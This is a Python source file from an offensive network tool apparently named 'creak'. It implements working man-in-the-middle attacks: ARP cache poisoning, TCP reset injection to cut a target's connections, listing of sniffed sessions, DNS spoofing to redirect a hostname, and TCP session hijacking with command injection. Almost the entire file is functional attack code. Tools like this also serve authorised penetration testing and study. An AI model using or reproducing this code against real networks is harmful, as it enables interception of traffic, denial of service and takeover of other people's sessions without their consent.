# -*- coding: utf-8 -*-
# Copyright (c) 2014-2017 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

""" Mitm main module, contains classes responsible for the attacks """

import os
import re
import sys
import time
import logging as log
from socket import socket, inet_ntoa, inet_aton, gethostbyname, PF_PACKET, SOCK_RAW
from threading import Thread
try:
    from scapy.all import ARP, IP, UDP, DNS, DNSRR, conf, send
    conf.verb = 0
except ImportError:
    print("[!] Missing module scapy, try setting SCAPY to False in config.py "
          "or install missing module")
try:
    import pcap
except ImportError:
    print("[!] Missing modules pcap, try setting SCAPY to True in config.py "
          "or install missing modules")
try:
    import dpkt
except ImportError:
    print("[!] Missing modules dpkt, try setting SCAPY to True in config.py "
          "or install missing modules")
try:
    import dnet
except ImportError:
    print("[!] Missing module dnet, DNS spoofing (-2 options) won't work")
import creak.utils as utils

try:
    xrange
except NameError:
    xrange = range


(G, W, R) = (utils.G, utils.W, utils.R)

class CaptureFilter:

    def __init__(self, targets):
        if not isinstance(targets, list):
            self.targets = [targets]
        else:
            self.targets = targets

    def build(self, prefix, port=None):
        """ build a capture filter based on arguments self.target and port"""
        prefix = prefix.rstrip()
        has_port = " and tcp port %s" % port if port else ""
        if len(self.targets) == 1:
            return prefix + " " + self.targets[0] + has_port
        capture_list = " or ".join(self.targets)
        return "(" + prefix + " " + capture_list + ")" + has_port

class Mitm(object):
    """
    Base abstract class for Man In The Middle attacks, poison and restore are
    left unimplemented
    """
    def __init__(self, device, source_mac, gateway, target, debug, verbose, capture_filter=None):
        self.dev = device
        self.src_mac = source_mac
        self.gateway = gateway
        self.target = target
        self.debug = debug
        self.verbose = verbose
        self.sessions = []
        self.capture_filter = CaptureFilter(self.target) if not capture_filter else capture_filter

    def _build_pcap_filter(self, prefix, port=None):
        """ build the pcap filter based on arguments self.target and port"""
        return self.capture_filter.build(prefix, port)

    def rst_inject(self, port=None):
        """
        injecting RESET packets to the target machine eventually blocking his
        connection and navigation
        """
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        pcap_filter = self._build_pcap_filter("ip host", port)

        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2,))
        poison_thread.daemon = True
        poison_thread.start()
        # start capturing packets
        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter) # we need only target packets

        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
              + ' and ' + R + ','.join(self.target) + W +'\n')

        has_port = (' on port ' + R + port + W) if port else ''
        print('[+] Sending RST packets to ' + R + ','.join(self.target) + W + has_port)

        if self.verbose:
            print('[+] Every dot symbolize a sent packet')

        counter = 0
        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                    tcp = ip_packet.data
                    if tcp.flags != dpkt.tcp.TH_RST:
                        # build tcp layer
                        tcp_layer = dpkt.tcp.TCP(
                            sport=tcp.sport,
                            dport=tcp.dport,
                            seq=tcp.seq + len(tcp.data),
                            ack=0,
                            off_x2=0x50,
                            flags=dpkt.tcp.TH_RST,
                            win=tcp.win,
                            sum=0,
                            urp=0)
                        # build ip layer
                        ip_layer = dpkt.ip.IP(
                            hl=ip_packet.hl,
                            tos=ip_packet.tos,
                            len=40,
                            id=ip_packet.id + 1,
                            off=0x4000,
                            ttl=128,
                            p=ip_packet.p,
                            sum=0,
                            src=ip_packet.src,
                            dst=ip_packet.dst,
                            data=tcp_layer)
                        # build ethernet layer
                        eth_layer = dpkt.ethernet.Ethernet(
                            dst=eth.dst,
                            src=eth.src,
                            type=eth.type,
                            data=ip_layer)

                        sock.send(str(eth_layer))

                        if self.verbose:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)

                        # rebuild layers
                        ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                        tcp_layer.sport, tcp_layer.dport = tcp.dport, tcp.sport
                        tcp_layer.ack, tcp_layer.seq = tcp.seq + len(tcp.data), tcp.ack
                        eth_layer.src, eth_layer.dst = eth.dst, eth.src

                        sock.send(str(eth_layer))

                        if self.verbose:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)
                            counter += 1

        except KeyboardInterrupt:
            print('[+] Rst injection interrupted\n\r')
            sock.close()
            self.restore(2)
            utils.set_ip_forward(0)

    def list_sessions(self, stop, target_b=None, port=None):
        """
        Try to get all TCP sessions of the target
        """
        notorious_services = {
            20: ' ftp-data session',
            21: ' ftp-data session',
            22: ' ssh session',
            23: ' telnet session',
            25: ' SMTP session',
            80: ' HTTP session',
            110: ' POP3 session',
            143: ' IMAP session',
            194: ' IRC session',
            220: ' IMAPv3 session',
            443: ' SSL session',
            445: ' SAMBA session',
            989: ' FTPS session',
            990: ' FTPS session',
            992: ' telnet SSL session',
            993: ' IMAP SSL session',
            994: ' IRC SSL session'
        }

        source = utils.get_default_gateway_linux()
        if target_b and target_b != self.gateway:
            source = utils.get_mac_by_ip(target_b)
        pcap_filter = self._build_pcap_filter("ip host", port)
        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter) # we need only self.target packets
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2, target_b, ))
        poison_thread.daemon = True
        poison_thread.start()
        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + source + W
              + ' and ' + R + ','.join(self.target) + W +'\n')
        sessions = {}
        try:
            for _, pkt in packets:
                if stop():
                    break
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                if ip_packet.p != dpkt.ip.IP_PROTO_TCP:
                    continue
                tcp = ip_packet.data
                if tcp.flags != dpkt.tcp.TH_RST:
                    sess = "%-25s <-> %25s" % (inet_ntoa(ip_packet.src) + ":"
                                               + str(tcp.sport), inet_ntoa(ip_packet.dst) + ":"
                                               + str(tcp.dport))
                    check = sess not in sessions

                    sessions[sess] = "Others"

                    if tcp.sport in notorious_services:
                        sessions[sess] = notorious_services[tcp.sport]
                    elif tcp.dport in notorious_services:
                        sessions[sess] = notorious_services[tcp.dport]

                    if check:
                        print(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))
                        self.sessions.append(sess)

        except KeyboardInterrupt:
            print('[+] Session scan interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

    def dns_spoof(self, host=None, redirection=None):
        """
        Redirect all incoming request for 'host' to 'redirection'
        """
        pcap_filter = self._build_pcap_filter('udp dst port 53 and src')
        redirection = gethostbyname(redirection)
        sock = dnet.ip()

        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
              + ' and ' + R + ','.join(self.target) + W +'\n')
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2, ))
        poison_thread.daemon = True
        poison_thread.start()

        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter)

        print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R
              + ','.join(self.target) + W)

        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                udp = ip_packet.data
                dns = dpkt.dns.DNS(udp.data)
                # validate query
                if dns.qr != dpkt.dns.DNS_Q:
                    continue
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    continue
                if len(dns.qd) != 1:
                    continue
                if len(dns.an) != 0:
                    continue
                if len(dns.ns) != 0:
                    continue
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    continue
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    continue
                # spoof for our target name
                if dns.qd[0].name != host:
                    continue

                # dns query->response
                dns.op = dpkt.dns.DNS_RA
                dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                dns.qr = dpkt.dns.DNS_R

                # construct fake answer
                arr = dpkt.dns.DNS.RR()
                arr.cls, arr.type, arr.name = dpkt.dns.DNS_IN, dpkt.dns.DNS_A, host
                arr.ip = dnet.addr(redirection).ip

                dns.an.append(arr)

                udp.sport, udp.dport = udp.dport, udp.sport
                ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                udp.data, udp.ulen = dns, len(udp)
                ip_packet.len = len(ip_packet)

                print(inet_ntoa(ip_packet.src))

                buf = dnet.ip_checksum(str(ip_packet))
                sock.send(buf)

        except KeyboardInterrupt:
            print('[+] DNS spoofing interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

    def hijack_session(self, target_b=None):
        """
        !! Still bugged, doesn't work properly !!
        Try to hijack a TCP sessions between two local address
        """
        if not target_b:
            target_b = self.gateway
        print('[+] Sessions between {}{}{} and {}{}{} will be listed soon,\n'
              '    just type the number of session to hijack and ENTER\n'.format(G, self.target,
                                                                                 W, G, target_b, W))
        stop_thread = False
        list_conn_thread = Thread(target=self.list_sessions, args=(lambda: stop_thread, target_b, ))
        list_conn_thread.start()
        choice = None
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        while True:
            choice = raw_input()
            choice = int(choice) - 1
            if choice <= len(self.sessions) and choice > -1:
                break
        # must stop thread
        stop_thread = True
        list_conn_thread.join()
        src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+)\s+<->\s+([0-9.]+):(\d+)$',
                                                       self.sessions[choice]).groups()
        str_src_ip, str_src_port, str_dst_ip, str_dst_port = src_ip, src_port, dst_ip, dst_port
        print('\n[*] Trying an hijack for: {}:{} --> {}:{}'.format(src_ip,
                                                                   src_port, dst_ip, dst_port))
        print('\n[*] Waiting for another packet in order to get a seq and a ack number')
        pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (src_ip, src_port, dst_ip, dst_port)
        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter)
        eth = None
        for _, pkt in packets:
            eth = dpkt.ethernet.Ethernet(pkt)
            ip_packet = eth.data
            tcp = ip_packet.data
            if ip_packet.src == dst_ip:
                src_port, dst_port = tcp.dport, tcp.sport
            else:
                src_port, dst_port = tcp.sport, tcp.dport
            seq, ack, data = tcp.seq, tcp.ack, tcp.data
            print('[*] Packet captured => SEQ: {}, ACK: {}'.format(seq, ack))
            seq += len(data)
            print('[*] Sending 1024 bytes nop payload to trying a desynchronization.\n')
            tcp_layer = dpkt.tcp.TCP(
                sport=src_port,
                dport=dst_port,
                seq=seq,
                ack=ack,
                data='\x00' * 1024)
            # build ip layer
            ip_layer = dpkt.ip.IP(
                src=src_ip,
                dst=dst_ip,
                data=tcp_layer)
            # build ethernet layer
            eth_layer = dpkt.ethernet.Ethernet(
                dst=eth.dst,
                src=eth.src,
                type=eth.type,
                data=ip_layer)

            sock.send(str(eth_layer))
            seq += 1024
            print('[*] Desynchronization complete.')
            break

        def response_to(ack):
            """Daemon function used to intercept responses from the hijacked session"""
            pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (str_dst_ip, str_dst_port, str_src_ip, str_src_port)
            sock = socket(PF_PACKET, SOCK_RAW)
            sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
            packets = pcap.pcap(self.dev)
            packets.setfilter(pcap_filter)
            eth = None
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                tcp = ip_packet.data
                if tcp.seq == ack:
                    seq = tcp.ack
                    if len(tcp.data) > 0:
                        ack += len(tcp.data)
                        tcp_layer = dpkt.tcp.TCP(
                            sport=src_port,
                            dport=dst_port,
                            seq=seq,
                            ack=ack)
                        # build ip layer
                        ip_layer = dpkt.ip.IP(
                            src=src_ip,
                            dst=dst_ip,
                            data=tcp_layer)
                        # build ethernet layer
                        eth_layer = dpkt.ethernet.Ethernet(
                            dst=eth.dst,
                            src=eth.src,
                            type=eth.type,
                            data=ip_layer)

                        sock.send(str(eth_layer))
                        sys.stdout.write(tcp.data)

        # start a thread to handle responses to the hijacked session
        tcpdaemon_thread = Thread(target=response_to, args=(ack,))
        tcpdaemon_thread.daemon = True
        tcpdaemon_thread.start()
        os.system('/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP' % (str_src_ip, str_src_port))
        os.system('/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP' % (str_src_ip, str_src_port))
        print('[*] Session hijacked, everything entered now should be sent through it.')

        # start a command loop to send instruction to the hijacked session
        try:
            while True:
                data = raw_input('> ')
                tcp_layer = dpkt.tcp.TCP(
                    sport=src_port,
                    dport=dst_port,
                    seq=seq,
                    ack=1,
                    data=data)
                # build ip layer
                ip_layer = dpkt.ip.IP(
                    src=src_ip,
                    dst=dst_ip,
                    data=tcp_layer)
                # build ethernet layer
                eth_layer = dpkt.ethernet.Ethernet(
                    dst=eth.dst,
                    src=eth.src,
                    type=eth.type,
                    data=ip_layer)

                sock.send(str(eth_layer))
                seq += len(data)
        except KeyboardInterrupt:
            print('[+] Session hijacking interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

    def poison(self, delay, target_b=None):
        """
        Poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        raise NotImplementedError("not implemented")

    def restore(self, delay, target_b=None):
        """ reset arp cache of the target and the router (AP) """
        raise NotImplementedError("not implemented")

class PcapMitm(Mitm):
    """
    Man In The Middle subclass using raw sockets to poison the targets
    """
    def __init__(self, device, source_mac, gateway, target, debug, verbose):
        super(PcapMitm, self).__init__(device, source_mac, gateway, target,
                                       debug, verbose)

    def poison(self, delay, target_b=None):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        if not target_b:
            target_b = self.gateway
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while True:
                if self.debug:
                    log.info('[+] %s <-- %s -- %s -- %s --> %s',
                             target_b, self.target, self.dev, target_b, self.target)
                for addr in self.target:
                    sock.send(str(utils.build_arp_packet(self.src_mac, target_b, addr)))
                    sock.send(str(utils.build_arp_packet(self.src_mac, addr, target_b)))
                time.sleep(delay) # OS refresh ARP cache really often

        except KeyboardInterrupt:
            print('\n\r[+] Poisoning interrupted')
            sock.close()

    def restore(self, delay, target_b=None):
        """ reset arp cache of the target and the router (AP) """
        if not target_b:
            target_b = self.gateway
        source_mac = utils.get_mac_by_ip(target_b)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
        for addr in self.target:
            target_mac = utils.get_mac_by_ip(addr)
            for _ in xrange(6):
                sock.send(str(utils.build_arp_packet(target_mac, target_b, addr)))
                sock.send(str(utils.build_arp_packet(source_mac, addr, target_b)))

class ScapyMitm(Mitm):
    """
    Man In The Middle subclass using scapy to poison the target, needs tcpdump to be
    installed
    """
    def __init__(self, device, source_mac, gateway, target, debug, verbose):
        super(ScapyMitm, self).__init__(device, source_mac, gateway, target,
                                        debug, verbose)

    def poison(self, delay, target_b=None):
        if not target_b:
            target_b = self.gateway
        src_mac = ':'.join(a+b for a, b in zip(self.src_mac[::2], self.src_mac[1::2]))
        for addr in self.target:
            dst_mac = utils.get_mac_by_ip(addr)
            send(ARP(op=2, pdst=addr, psrc=target_b, hwdst=dst_mac), verbose=False)
            send(ARP(op=2, pdst=target_b, psrc=addr, hwdst=src_mac), verbose=False)

    def restore(self, delay, target_b=None):
        if not target_b:
            target_b = self.gateway
        src_mac = ':'.join(a+b for a, b in zip(self.src_mac[::2], self.src_mac[1::2]))
        for addr in self.target:
            dst_mac = utils.get_mac_by_ip(addr)
            send(ARP(op=2, pdst=target_b, psrc=addr,
                     hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
            send(ARP(op=2, pdst=addr, psrc=target_b,
                     hwdst="ff:" * 5 + "ff", hwsrc=src_mac), count=3, verbose=False)

    def dns_spoof(self, host=None, redirection=None):
        """
        Redirect all incoming request for 'host' to 'redirection'
        """
        pcap_filter = self._build_pcap_filter('udp dst port 53 and src')
        redirection = gethostbyname(redirection)

        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
              + ' and ' + R + ','.join(self.target) + W +'\n')
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison, args=(2, ))
        poison_thread.daemon = True
        poison_thread.start()

        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter)

        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))

        print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R
              + ','.join(self.target) + W)

        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                udp = ip_packet.data
                dns = dpkt.dns.DNS(udp.data)
                # validate query
                if dns.qr != dpkt.dns.DNS_Q:
                    continue
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    continue
                if len(dns.qd) != 1:
                    continue
                if len(dns.an) != 0:
                    continue
                if len(dns.ns) != 0:
                    continue
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    continue
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    continue
                # spoof for our target name
                if dns.qd[0].name != host:
                    continue
                # send spoofed answer
                send(IP(src=inet_ntoa(ip_packet.dst), dst=inet_ntoa(ip_packet.src))/
                     UDP(sport=udp.dport, dport=udp.sport)/
                     DNS(opcode=dpkt.dns.DNS_RA, rcode=dpkt.dns.DNS_RCODE_NOERR,
                         qr=dpkt.dns.DNS_R, an=DNSRR(rrname=host, type=dpkt.dns.DNS_A,
                                                     rclass=dpkt.dns.DNS_IN,
                                                     rdata=redirection)))
                # dns query->response
                # dns.op = dpkt.dns.DNS_RA
                # dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                # dns.qr = dpkt.dns.DNS_R
                #
                # # construct fake answer
                # arr = dpkt.dns.DNS.RR()
                # arr.cls, arr.type, arr.name = dpkt.dns.DNS_IN, dpkt.dns.DNS_A, host
                # # arr.ip = dnet.addr(redirection).ip
                # arr.ip = socket.inet_aton(redirection)
                #
                # dns.an.append(arr)
                #
                # udp.sport, udp.dport = udp.dport, udp.sport
                # ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                # udp.data, udp.ulen = dns, len(udp)
                # ip_packet.len = len(ip_packet)
                #
                #
                # sock.send(str(ip_packet))

                print(inet_ntoa(ip_packet.dst))

        except KeyboardInterrupt:
            print('[+] DNS spoofing interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)

